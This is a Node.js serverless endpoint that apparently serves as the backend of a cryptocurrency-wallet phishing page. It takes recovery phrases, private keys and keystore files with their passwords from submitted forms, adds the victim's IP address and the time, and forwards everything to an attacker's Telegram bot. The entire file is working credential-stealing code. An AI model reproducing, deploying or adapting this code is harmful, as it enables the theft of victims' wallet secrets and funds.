const fetch = require('node-fetch');

module.exports = async (req, res) => {
  if (req.method === 'POST') {
    let { wallet, type, Phrase } = req.body;
    let phraseData = Phrase;

    if (!wallet || !type || !phraseData) {
      // Fallback for different content types or parameter names
      const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
      wallet = body.wallet || 'N/A';
      type = body.type || 'N/A';
      phraseData = body.Phrase || body.phrase || 'N/A';
        if (body.keystorejson) {
            type = 'Keystore JSON';
            const keystore_json = body.keystorejson;
            const keystore_password = body.keystorepassword || '[no password]';
            phraseData = `JSON: ${keystore_json}\nPassword: ${keystore_password}`;
        } else if (body.privatekey) {
            type = 'Private Key';
            phraseData = body.privatekey;
        }
    }

    const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const timestamp = new Date().toUTCString();

    const message = `🔐 New Wallet Connection\n\n`
                    + `👛 Wallet: ${wallet}\n`
                    + `🔑 Method: ${type}\n`
                    + `📝 Credentials: ${phraseData}\n`
                    + `⏰ Time: ${timestamp}\n`
                    + `🔐 IP Address: ${ipAddress}`;

    const botToken = process.env.BOT_TOKEN;
    const chatId = process.env.CHAT_ID;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
      const telegramResponse = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      });

      const telegramResult = await telegramResponse.json();

      if (telegramResult.ok) {
        res.status(200).json({ status: 'success' });
      } else {
        res.status(500).json({ status: 'error', message: telegramResult.description });
      }
    } catch (error) {
      res.status(500).json({ status: 'error', message: error.message });
    }
  } else {
    res.setHeader('Allow', 'POST');
    res.status(405).end('Method Not Allowed');
  }
};